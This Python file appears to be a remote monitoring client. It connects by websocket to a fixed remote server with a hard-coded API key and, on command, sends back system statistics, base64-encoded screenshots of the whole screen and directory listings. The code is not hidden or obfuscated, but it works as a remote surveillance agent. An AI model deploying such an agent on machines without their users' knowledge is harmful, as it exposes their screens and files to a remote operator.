import os
import sys
import psutil
import socket
import requests
import platform
from datetime import datetime
import json
from flask import Flask, request
import threading
import logging
import asyncio
import websockets
import base64
from PIL import ImageGrab
from io import BytesIO

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

SERVER_URL = "https://kenanpeyser.up.railway.app"
WEBSOCKET_URL = "wss://kenanpeyser.up.railway.app/ws"
CLIENT_ID = socket.gethostname()
API_KEY = "K3N4N_P3YS3R_S3CR3T_K3Y"  # Güvenli bir API anahtarı

def get_system_info():
    info = {
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "cpu_percent": psutil.cpu_percent(),
        "memory_percent": psutil.virtual_memory().percent,
        "disk_usage": psutil.disk_usage('/').percent,
        "last_update": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    return info

def take_screenshot():
    try:
        # Ekran görüntüsü al
        screenshot = ImageGrab.grab()
        
        # Base64'e çevir
        buffered = BytesIO()
        screenshot.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        
        return {
            "success": True,
            "image": img_str,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

def list_files(path="."):
    try:
        files = []
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            item_info = {
                "name": item,
                "path": item_path,
                "is_directory": os.path.isdir(item_path),
                "size": os.path.getsize(item_path) if os.path.isfile(item_path) else 0
            }
            files.append(item_info)
        return {
            "success": True,
            "files": files,
            "current_path": os.path.abspath(path)
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }

async def websocket_client():
    while True:
        try:
            async with websockets.connect(WEBSOCKET_URL) as websocket:
                await websocket.send(json.dumps({
                    "type": "register",
                    "client_id": CLIENT_ID,
                    "api_key": API_KEY
                }))
                
                while True:
                    message = await websocket.recv()
                    data = json.loads(message)
                    
                    if data["type"] == "command":
                        response = None
                        if data["command"] == "status":
                            response = get_system_info()
                        elif data["command"] == "screenshot":
                            response = take_screenshot()
                        elif data["command"] == "files":
                            response = list_files()
                        
                        if response:
                            await websocket.send(json.dumps({
                                "type": "response",
                                "command": data["command"],
                                "data": response
                            }))
                    
        except Exception as e:
            logging.error(f"Websocket error: {e}")
            await asyncio.sleep(5)  # Yeniden bağlanmadan önce bekle

@app.route('/status', methods=['GET'])
def status():
    if request.headers.get('X-API-Key') != API_KEY:
        return {"error": "Unauthorized"}, 401
    return get_system_info()

def start_client():
    try:
        # Flask uygulamasını başlat
        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
        
        # Websocket client'ı başlat
        asyncio.get_event_loop().run_until_complete(websocket_client())
        
    except Exception as e:
        logging.error(f"Error starting client: {e}")
        sys.exit(1)

if __name__ == "__main__":
    start_client()
